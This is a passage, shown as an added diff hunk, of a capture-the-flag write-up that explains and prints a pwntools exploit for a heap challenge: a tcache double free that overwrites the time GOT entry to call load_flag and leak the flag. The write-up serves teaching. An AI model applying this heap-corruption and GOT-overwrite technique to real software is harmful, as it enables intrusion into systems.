@@ -83,3 +83,215 @@ Now since our program thinks that we have a valid chunk at this address, we will
 In combination with only partial RELRO and no PIE, this means we could theoretically overwrite a GOT address without leaking anything and pointing it to some useful function like load_flag.
 
 The final exploit does pretty much just that.
+
+First some boilerplate code to get pwntools working:
+```py
+#!/usr/bin/python3
+
+from pwn import *
+import sys
+
+argv = sys.argv
+
+DEBUG = False
+BINARY = argv[1]
+elf = ELF(BINARY)
+
+context.binary = BINARY
+context.terminal = ['tmux', 'splitw', '-v']
+
+def attach_gdb():
+        gdb.attach(sh)
+
+
+if DEBUG:
+        context.log_level = 'debug'
+
+def connect():
+    if len(argv) < 3:
+        stdout = process.PTY
+        stdin = process.PTY
+
+        sh = process(BINARY, stdout=stdout, stdin=stdin)
+
+        if DEBUG:
+                attach_gdb()
+
+        REMOTE = False
+    else:
+        NC = sys.argv[2]
+        ip = NC.split(":")[0]
+        port = int(NC.split(":")[1])
+        sh = remote(ip, port)
+        REMOTE = True
+    return sh
+
+# Cool!
+splash()
+
+# Connect to local/remote process
+sh = connect()
+```
+
+Since PIE is not enabled, a lot of the addresses we need to use will be constant (for example GOT addresses and user made functions and variables). As such we can use gdb to get these addresses and put them in our exploit:
+```py
+# some locations (PIE not enabled)
+flagBuf = p64(0x404100)
+time_got = p64(0x404040)
+load_flag = p64(0x401276)
+```
+
+The real exploit now begins. Before we start messing around with the tcache, lets first change one of the chunks name pointers to point to flagBuf instead, which is where our flag will be loaded. To do this all we have to do is free and reallocate a chunk but edit the name of the chunk to instead be the address for flagBuf:
+```py
+# put pointer to flagBuf as name for reading purposes
+sh.sendline('1')
+sh.sendline('2')
+
+sh.sendline('2')
+sh.sendline(flagBuf)
+```
+
+Ok now the juiciest part of the exploit. We will now free a chunk twice to get it on the tcache twice:
+```py
+# double free
+sh.sendline('1')
+sh.sendline('1')
+
+sh.sendline('1')
+sh.sendline('1')
+```
+
+We now edit the forward pointer of the double freed chunk to point to the `time` function (GOT entry) instead:
+```py
+# put time on the tcache
+sh.sendline('2')
+sh.sendline(time_got)
+```
+
+The tcache now looks like:
+```
+TCACHE:
+our_chunk -> time_got -> time -> ???
+```
+
+We allocate a chunk again to get `time_got` at the top of the tcache bin.
+I'm not sure whether it is necessary to overwrite our_chunk with the same time_got address again, but I do so anyways just in case:
+```py
+sh.sendline('2')
+sh.sendline(time_got)
+```
+
+Ok now our next allocation will be at time_got, which means we will be overwriting the data in time_got.
+We can overwrite the GOT entry to point to any function we want, instead of the normal libc time function.
+Let's make it point to the `load_flag` function:
+```py
+# malloc got for time and make it point to load_flag instead
+sh.sendline('2')
+sh.sendline(load_flag)
+```
+
+And now we call time through our program, which will actually be calling `load_flag` instead:
+```py
+# call time -> load_flag
+sh.sendline('5')
+```
+
+Ok so now that our flag is loaded into the flagBuf, we can read the chunk that had it's name at flagBuf to leak the flag:
+```py
+# read from flagBuf using first chunk
+sh.sendline('3')
+sh.sendline('2')
+```
+
+And that's it!
+
+The final exploit script is:
+```py
+#!/usr/bin/python3
+
+from pwn import *
+import sys
+
+argv = sys.argv
+
+DEBUG = False
+BINARY = argv[1]
+elf = ELF(BINARY)
+
+context.binary = BINARY
+context.terminal = ['tmux', 'splitw', '-v']
+
+def attach_gdb():
+	gdb.attach(sh)
+
+
+if DEBUG:
+	context.log_level = 'debug'
+
+def connect():
+    if len(argv) < 3:
+    	stdout = process.PTY
+    	stdin = process.PTY
+
+    	sh = process(BINARY, stdout=stdout, stdin=stdin)
+
+    	if DEBUG:
+    		attach_gdb()
+
+    	REMOTE = False
+    else:
+    	NC = sys.argv[2]
+    	ip = NC.split(":")[0]
+    	port = int(NC.split(":")[1])
+    	sh = remote(ip, port)
+    	REMOTE = True
+    return sh
+
+# Cool!
+splash()
+
+# Connect to local/remote process
+sh = connect()
+
+# some locations (PIE not enabled) 
+flagBuf = p64(0x404100)
+time_got = p64(0x404040)
+load_flag = p64(0x401276)
+
+# put pointer to flagBuf as name for reading purposes
+sh.sendline('1')
+sh.sendline('2')
+
+sh.sendline('2')
+sh.sendline(flagBuf)
+
+# double free
+sh.sendline('1')
+sh.sendline('1')
+
+sh.sendline('1')
+sh.sendline('1')
+
+# put time on the tcache
+sh.sendline('2')
+sh.sendline(time_got)
+
+sh.sendline('2')
+sh.sendline(time_got)
+
+# malloc got for time and make it point to load_flag instead
+sh.sendline('2')
+sh.sendline(load_flag)
+
+# call time -> load_flag
+sh.sendline('5')
+
+# read from flagBuf using first chunk
+sh.sendline('3')
+sh.sendline('2')
+
+# Open shell
+sh.interactive()
+```
+
+Flag: `gnsCTF{yad_etisoppo_s'ti}`
